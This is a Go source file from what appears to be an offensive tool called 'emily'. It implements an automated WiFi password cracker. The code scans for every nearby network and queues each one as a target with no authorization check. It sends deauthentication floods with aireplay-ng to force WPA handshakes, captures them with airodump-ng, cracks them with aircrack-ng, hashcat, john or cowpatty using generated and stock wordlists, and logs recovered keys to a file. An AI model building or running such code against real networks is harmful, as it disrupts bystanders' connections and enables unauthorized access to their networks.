//go:build linux
// +build linux

package scanner

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/null/emily/internal/config"
)

// PasswordCracker implements advanced WiFi password cracking capabilities
// Supports WPA/WPA2, WEP, and WPS attacks with multiple attack vectors
type PasswordCracker struct {
	config          *config.Config
	running         bool
	mutex           sync.RWMutex
	targetNetworks  map[string]*WiFiTarget
	crackingJobs    chan *CrackingJob
	results         chan *CrackResult
	wordlists       []string
	handshakeDir    string
	crackingActive  bool
	attackMethods   []AttackMethod
}

// WiFiTarget represents a WiFi network target for cracking
type WiFiTarget struct {
	BSSID       string
	SSID        string
	Channel     int
	Security    string
	Signal      int
	Handshake   string
	Priority    int
	Attempts    int
	LastSeen    time.Time
	Cracked     bool
	Password    string
}

// CrackingJob represents a password cracking job
type CrackingJob struct {
	Target      *WiFiTarget
	Method      AttackMethod
	Wordlist    string
	HandshakeFile string
	Priority    int
	StartTime   time.Time
	Timeout     time.Duration
}

// CrackResult represents the result of a cracking attempt
type CrackResult struct {
	Target      *WiFiTarget
	Method      AttackMethod
	Success     bool
	Password    string
	Duration    time.Duration
	KeysPerSec  int
	Error       error
}

// AttackMethod represents different attack methods
type AttackMethod struct {
	Name        string
	Command     string
	Args        []string
	Timeout     time.Duration
	Priority    int
	Requirements []string
}

// NewPasswordCracker creates a new password cracking engine
func NewPasswordCracker(cfg *config.Config) *PasswordCracker {
	return &PasswordCracker{
		config:         cfg,
		targetNetworks: make(map[string]*WiFiTarget),
		crackingJobs:   make(chan *CrackingJob, 100),
		results:        make(chan *CrackResult, 100),
		handshakeDir:   "/tmp/emily/handshakes",
		attackMethods:  initializeAttackMethods(),
		wordlists:      findWordlists(),
	}
}

// initializeAttackMethods sets up available attack methods
func initializeAttackMethods() []AttackMethod {
	return []AttackMethod{
		{
			Name:         "aircrack-ng",
			Command:      "aircrack-ng",
			Args:         []string{"-w", "{WORDLIST}", "{HANDSHAKE}"},
			Timeout:      30 * time.Minute,
			Priority:     1,
			Requirements: []string{"aircrack-ng"},
		},
		{
			Name:         "hashcat",
			Command:      "hashcat",
			Args:         []string{"-m", "2500", "-a", "0", "{HANDSHAKE}", "{WORDLIST}"},
			Timeout:      60 * time.Minute,
			Priority:     2,
			Requirements: []string{"hashcat"},
		},
		{
			Name:         "john",
			Command:      "john",
			Args:         []string{"--wordlist={WORDLIST}", "--format=wpapsk", "{HANDSHAKE}"},
			Timeout:      45 * time.Minute,
			Priority:     3,
			Requirements: []string{"john"},
		},
		{
			Name:         "cowpatty",
			Command:      "cowpatty",
			Args:         []string{"-r", "{HANDSHAKE}", "-f", "{WORDLIST}", "-s", "{SSID}"},
			Timeout:      20 * time.Minute,
			Priority:     4,
			Requirements: []string{"cowpatty"},
		},
	}
}

// findWordlists locates available wordlists
func findWordlists() []string {
	wordlistPaths := []string{
		"/usr/share/wordlists/rockyou.txt",
		"/usr/share/wordlists/fasttrack.txt",
		"/usr/share/wordlists/nmap.lst",
		"/opt/emily/wordlists/custom.txt",
		"/tmp/emily/generated_wordlist.txt",
	}
	
	var available []string
	for _, path := range wordlistPaths {
		if _, err := os.Stat(path); err == nil {
			available = append(available, path)
		}
	}
	
	// Generate dynamic wordlist if none available
	if len(available) == 0 {
		if dynamicList := generateDynamicWordlist(); dynamicList != "" {
			available = append(available, dynamicList)
		}
	}
	
	return available
}

// generateDynamicWordlist creates a dynamic wordlist based on common patterns
func generateDynamicWordlist() string {
	wordlistPath := "/tmp/emily/generated_wordlist.txt"
	
	// Create directory if it doesn't exist
	os.MkdirAll(filepath.Dir(wordlistPath), 0755)
	
	file, err := os.Create(wordlistPath)
	if err != nil {
		return ""
	}
	defer file.Close()
	
	// Common passwords and patterns
	commonPasswords := []string{
		"password", "123456", "password123", "admin", "12345678",
		"qwerty", "abc123", "Password1", "welcome", "letmein",
		"monkey", "1234567890", "dragon", "trustno1", "freedom",
	}
	
	// Write common passwords
	for _, pwd := range commonPasswords {
		file.WriteString(pwd + "\n")
		
		// Add variations
		file.WriteString(pwd + "1" + "\n")
		file.WriteString(pwd + "123" + "\n")
		file.WriteString(pwd + "!" + "\n")
		file.WriteString(strings.ToUpper(pwd) + "\n")
	}
	
	// Add date-based patterns
	currentYear := time.Now().Year()
	for year := currentYear - 5; year <= currentYear + 1; year++ {
		file.WriteString(fmt.Sprintf("password%d\n", year))
		file.WriteString(fmt.Sprintf("admin%d\n", year))
		file.WriteString(fmt.Sprintf("%d\n", year))
	}
	
	// Add numeric patterns
	for i := 0; i <= 9999; i++ {
		if i < 10 {
			file.WriteString(fmt.Sprintf("password%d\n", i))
		}
		if i < 100 {
			file.WriteString(fmt.Sprintf("%02d%02d%02d%02d\n", i, i, i, i))
		}
		if i < 1000 {
			file.WriteString(fmt.Sprintf("%03d%03d\n", i, i))
		}
	}
	
	return wordlistPath
}

// Start initializes the password cracking engine
func (p *PasswordCracker) Start(ctx context.Context) error {
	p.running = true
	
	// Create handshake directory
	if err := os.MkdirAll(p.handshakeDir, 0755); err != nil {
		return fmt.Errorf("failed to create handshake directory: %w", err)
	}
	
	// Start worker goroutines
	go p.jobProcessor(ctx)
	go p.resultProcessor(ctx)
	go p.continuousScanning(ctx)
	
	return nil
}

// Stop stops the password cracking engine
func (p *PasswordCracker) Stop() error {
	p.running = false
	return nil
}

// AddTarget adds a WiFi network target for cracking
func (p *PasswordCracker) AddTarget(bssid, ssid string, channel int, security string, signal int) {
	p.mutex.Lock()
	defer p.mutex.Unlock()
	
	if target, exists := p.targetNetworks[bssid]; exists {
		// Update existing target
		target.LastSeen = time.Now()
		target.Signal = signal
		target.Attempts++
	} else {
		// Create new target
		target := &WiFiTarget{
			BSSID:    bssid,
			SSID:     ssid,
			Channel:  channel,
			Security: security,
			Signal:   signal,
			Priority: p.calculatePriority(security, signal),
			LastSeen: time.Now(),
		}
		p.targetNetworks[bssid] = target
		
		// Start cracking process if appropriate
		if p.shouldAttemptCrack(target) {
			go p.startCrackingProcess(target)
		}
	}
}

// calculatePriority calculates target priority based on security and signal
func (p *PasswordCracker) calculatePriority(security string, signal int) int {
	priority := 0
	
	// Higher priority for weaker security
	switch strings.ToUpper(security) {
	case "WEP":
		priority += 10 // WEP is easiest to crack
	case "WPA":
		priority += 7
	case "WPA2":
		priority += 5
	case "WPS":
		priority += 8 // WPS has vulnerabilities
	case "OPEN":
		priority += 15 // Open networks are highest priority
	}
	
	// Higher priority for stronger signals
	if signal > -30 {
		priority += 5
	} else if signal > -50 {
		priority += 3
	} else if signal > -70 {
		priority += 1
	}
	
	return priority
}

// shouldAttemptCrack determines if we should attempt to crack a target
func (p *PasswordCracker) shouldAttemptCrack(target *WiFiTarget) bool {
	// Don't crack if already cracked
	if target.Cracked {
		return false
	}
	
	// Don't crack open networks
	if strings.ToUpper(target.Security) == "OPEN" {
		return false
	}
	
	// Don't crack if too many attempts
	if target.Attempts > 5 {
		return false
	}
	
	// Don't crack weak signals
	if target.Signal < -80 {
		return false
	}
	
	return true
}

// startCrackingProcess starts the cracking process for a target
func (p *PasswordCracker) startCrackingProcess(target *WiFiTarget) {
	if p.config.Core.Debug {
		fmt.Printf("[CRACK] Starting cracking process for %s (%s)\n", target.SSID, target.BSSID)
	}
	
	// First, try to capture handshake
	if err := p.captureHandshake(target); err != nil {
		if p.config.Core.Debug {
			fmt.Printf("[CRACK] Failed to capture handshake for %s: %v\n", target.SSID, err)
		}
		return
	}
	
	// Try different attack methods
	for _, method := range p.attackMethods {
		if p.isMethodAvailable(method) {
			for _, wordlist := range p.wordlists {
				job := &CrackingJob{
					Target:      target,
					Method:      method,
					Wordlist:    wordlist,
					HandshakeFile: target.Handshake,
					Priority:    target.Priority + method.Priority,
					StartTime:   time.Now(),
					Timeout:     method.Timeout,
				}
				
				select {
				case p.crackingJobs <- job:
					// Job queued successfully
				default:
					// Queue full, skip this job
					if p.config.Core.Debug {
						fmt.Printf("[CRACK] Job queue full, skipping %s with %s\n", target.SSID, method.Name)
					}
				}
			}
		}
	}
}

// captureHandshake captures WPA handshake for a target
func (p *PasswordCracker) captureHandshake(target *WiFiTarget) error {
	handshakeFile := filepath.Join(p.handshakeDir, fmt.Sprintf("%s_%s.cap", target.SSID, target.BSSID))
	
	// Check if handshake already exists
	if _, err := os.Stat(handshakeFile); err == nil {
		target.Handshake = handshakeFile
		return nil
	}
	
	// Try to capture handshake using airodump-ng
	cmd := exec.Command("timeout", "60s", "airodump-ng",
		"--bssid", target.BSSID,
		"--channel", fmt.Sprintf("%d", target.Channel),
		"--write", handshakeFile[:len(handshakeFile)-4], // Remove .cap extension
		"wlan0mon")
	
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("airodump-ng failed: %w", err)
	}
	
	// Try to force handshake with deauth attack
	go p.performDeauthAttack(target)
	
	// Wait for handshake file to be created
	for i := 0; i < 30; i++ {
		if _, err := os.Stat(handshakeFile); err == nil {
			target.Handshake = handshakeFile
			return nil
		}
		time.Sleep(2 * time.Second)
	}
	
	return fmt.Errorf("handshake capture timeout")
}

// performDeauthAttack performs deauthentication attack to force handshake
func (p *PasswordCracker) performDeauthAttack(target *WiFiTarget) {
	if p.config.Core.Debug {
		fmt.Printf("[CRACK] Performing deauth attack on %s\n", target.SSID)
	}
	
	// Send deauth packets
	cmd := exec.Command("aireplay-ng",
		"--deauth", "10",
		"-a", target.BSSID,
		"wlan0mon")
	
	cmd.Run() // Ignore errors for deauth
}

// isMethodAvailable checks if an attack method is available
func (p *PasswordCracker) isMethodAvailable(method AttackMethod) bool {
	for _, req := range method.Requirements {
		cmd := exec.Command("which", req)
		if err := cmd.Run(); err != nil {
			return false
		}
	}
	return true
}

// jobProcessor processes cracking jobs
func (p *PasswordCracker) jobProcessor(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case job := <-p.crackingJobs:
			if p.running {
				p.processJob(job)
			}
		}
	}
}

// processJob processes a single cracking job
func (p *PasswordCracker) processJob(job *CrackingJob) {
	if p.config.Core.Debug {
		fmt.Printf("[CRACK] Processing job: %s on %s with %s\n", 
			job.Method.Name, job.Target.SSID, job.Wordlist)
	}
	
	startTime := time.Now()
	
	// Prepare command arguments
	args := make([]string, len(job.Method.Args))
	for i, arg := range job.Method.Args {
		arg = strings.ReplaceAll(arg, "{WORDLIST}", job.Wordlist)
		arg = strings.ReplaceAll(arg, "{HANDSHAKE}", job.HandshakeFile)
		arg = strings.ReplaceAll(arg, "{SSID}", job.Target.SSID)
		args[i] = arg
	}
	
	// Execute cracking command with timeout
	ctx, cancel := context.WithTimeout(context.Background(), job.Timeout)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, job.Method.Command, args...)
	output, err := cmd.Output()
	
	duration := time.Since(startTime)
	
	// Parse results
	result := &CrackResult{
		Target:   job.Target,
		Method:   job.Method,
		Duration: duration,
		Error:    err,
	}
	
	if err == nil {
		password := p.extractPassword(string(output), job.Method.Name)
		if password != "" {
			result.Success = true
			result.Password = password
			job.Target.Cracked = true
			job.Target.Password = password
		}
	}
	
	// Send result
	select {
	case p.results <- result:
	default:
		// Result channel full
	}
}

// extractPassword extracts password from cracking tool output
func (p *PasswordCracker) extractPassword(output, method string) string {
	switch method {
	case "aircrack-ng":
		// Look for "KEY FOUND! [ password ]"
		re := regexp.MustCompile(`KEY FOUND! \[ (.+) \]`)
		if matches := re.FindStringSubmatch(output); len(matches) > 1 {
			return strings.TrimSpace(matches[1])
		}
		
	case "hashcat":
		// Look for hash:password format
		lines := strings.Split(output, "\n")
		for _, line := range lines {
			if strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				parts := strings.Split(line, ":")
				if len(parts) >= 2 {
					return strings.TrimSpace(parts[len(parts)-1])
				}
			}
		}
		
	case "john":
		// Look for "(password)" format
		re := regexp.MustCompile(`\((.+)\)`)
		if matches := re.FindStringSubmatch(output); len(matches) > 1 {
			return strings.TrimSpace(matches[1])
		}
		
	case "cowpatty":
		// Look for "The PSK is" format
		re := regexp.MustCompile(`The PSK is "(.+)"`)
		if matches := re.FindStringSubmatch(output); len(matches) > 1 {
			return strings.TrimSpace(matches[1])
		}
	}
	
	return ""
}

// resultProcessor processes cracking results
func (p *PasswordCracker) resultProcessor(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case result := <-p.results:
			p.handleResult(result)
		}
	}
}

// handleResult handles a cracking result
func (p *PasswordCracker) handleResult(result *CrackResult) {
	if result.Success {
		if p.config.Core.Debug {
			fmt.Printf("[CRACK] SUCCESS: %s (%s) cracked with password: %s\n",
				result.Target.SSID, result.Target.BSSID, result.Password)
		}
		
		// Save result to file
		p.saveResult(result)
		
		// Stop further attempts on this target
		result.Target.Cracked = true
		
	} else {
		if p.config.Core.Debug && result.Error != nil {
			fmt.Printf("[CRACK] Failed to crack %s with %s: %v\n",
				result.Target.SSID, result.Method.Name, result.Error)
		}
	}
}

// saveResult saves a successful crack result
func (p *PasswordCracker) saveResult(result *CrackResult) {
	resultFile := "/tmp/emily/cracked_passwords.txt"
	
	// Create directory if needed
	os.MkdirAll(filepath.Dir(resultFile), 0755)
	
	file, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	line := fmt.Sprintf("[%s] %s (%s) - %s - Method: %s - Duration: %v\n",
		timestamp, result.Target.SSID, result.Target.BSSID, 
		result.Password, result.Method.Name, result.Duration)
	
	file.WriteString(line)
}

// continuousScanning performs continuous scanning for new targets
func (p *PasswordCracker) continuousScanning(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if p.running {
				p.scanForTargets()
			}
		}
	}
}

// scanForTargets scans for new WiFi targets
func (p *PasswordCracker) scanForTargets() {
	// Use iwlist to scan for networks
	cmd := exec.Command("iwlist", "scan")
	output, err := cmd.Output()
	if err != nil {
		return
	}
	
	p.parseIwlistOutput(string(output))
}

// parseIwlistOutput parses iwlist scan output for targets
func (p *PasswordCracker) parseIwlistOutput(output string) {
	lines := strings.Split(output, "\n")
	
	var currentTarget *WiFiTarget
	
	for _, line := range lines {
		line = strings.TrimSpace(line)
		
		if strings.Contains(line, "Cell") && strings.Contains(line, "Address:") {
			// New network found
			if currentTarget != nil {
				p.processScannedTarget(currentTarget)
			}
			
			// Extract BSSID
			parts := strings.Split(line, "Address:")
			if len(parts) > 1 {
				bssid := strings.TrimSpace(parts[1])
				currentTarget = &WiFiTarget{
					BSSID: strings.ToLower(bssid),
				}
			}
		} else if currentTarget != nil {
			if strings.Contains(line, "ESSID:") {
				// Extract SSID
				parts := strings.Split(line, "ESSID:")
				if len(parts) > 1 {
					ssid := strings.Trim(strings.TrimSpace(parts[1]), "\"")
					if ssid != "" && ssid != "\\x00" {
						currentTarget.SSID = ssid
					}
				}
			} else if strings.Contains(line, "Frequency:") {
				// Extract channel from frequency
				if strings.Contains(line, "Channel") {
					re := regexp.MustCompile(`Channel (\d+)`)
					if matches := re.FindStringSubmatch(line); len(matches) > 1 {
						if channel, err := fmt.Sscanf(matches[1], "%d", &currentTarget.Channel); err == nil && channel == 1 {
							// Channel parsed successfully
						}
					}
				}
			} else if strings.Contains(line, "Quality=") || strings.Contains(line, "Signal level=") {
				// Extract signal level
				re := regexp.MustCompile(`Signal level=(-?\d+)`)
				if matches := re.FindStringSubmatch(line); len(matches) > 1 {
					if signal, err := fmt.Sscanf(matches[1], "%d", &currentTarget.Signal); err == nil && signal == 1 {
						// Signal parsed successfully
					}
				}
			} else if strings.Contains(line, "Encryption key:") {
				if strings.Contains(line, "off") {
					currentTarget.Security = "OPEN"
				} else {
					currentTarget.Security = "WEP" // Default, will be refined
				}
			} else if strings.Contains(line, "IE: IEEE 802.11i/WPA2") {
				currentTarget.Security = "WPA2"
			} else if strings.Contains(line, "IE: WPA") {
				currentTarget.Security = "WPA"
			}
		}
	}
	
	// Process final target
	if currentTarget != nil {
		p.processScannedTarget(currentTarget)
	}
}

// processScannedTarget processes a scanned target
func (p *PasswordCracker) processScannedTarget(target *WiFiTarget) {
	if target.BSSID != "" && target.SSID != "" {
		p.AddTarget(target.BSSID, target.SSID, target.Channel, target.Security, target.Signal)
	}
}

// GetCrackedPasswords returns all cracked passwords
func (p *PasswordCracker) GetCrackedPasswords() map[string]string {
	p.mutex.RLock()
	defer p.mutex.RUnlock()
	
	cracked := make(map[string]string)
	for bssid, target := range p.targetNetworks {
		if target.Cracked && target.Password != "" {
			cracked[bssid] = target.Password
		}
	}
	
	return cracked
}

// GetTargetStats returns statistics about targets
func (p *PasswordCracker) GetTargetStats() map[string]interface{} {
	p.mutex.RLock()
	defer p.mutex.RUnlock()
	
	stats := make(map[string]interface{})
	
	totalTargets := len(p.targetNetworks)
	crackedTargets := 0
	
	securityStats := make(map[string]int)
	
	for _, target := range p.targetNetworks {
		if target.Cracked {
			crackedTargets++
		}
		securityStats[target.Security]++
	}
	
	stats["total_targets"] = totalTargets
	stats["cracked_targets"] = crackedTargets
	stats["crack_rate"] = float64(crackedTargets) / float64(totalTargets) * 100
	stats["security_breakdown"] = securityStats
	stats["running"] = p.running
	
	return stats
}

// ForceAttack forces an attack on a specific BSSID
func (p *PasswordCracker) ForceAttack(bssid string) error {
	p.mutex.RLock()
	target, exists := p.targetNetworks[bssid]
	p.mutex.RUnlock()
	
	if !exists {
		return fmt.Errorf("target %s not found", bssid)
	}
	
	if target.Cracked {
		return fmt.Errorf("target %s already cracked", bssid)
	}
	
	go p.startCrackingProcess(target)
	return nil
}

// IsAvailable checks if password cracking capabilities are available
func (p *PasswordCracker) IsAvailable() bool {
	// Check for required tools
	requiredTools := []string{"aircrack-ng", "airodump-ng", "aireplay-ng"}
	
	for _, tool := range requiredTools {
		cmd := exec.Command("which", tool)
		if err := cmd.Run(); err != nil {
			return false
		}
	}
	
	// Check for wordlists
	return len(p.wordlists) > 0
}

// GetType returns the scanner type
func (p *PasswordCracker) GetType() string {
	return "password_cracker"
}
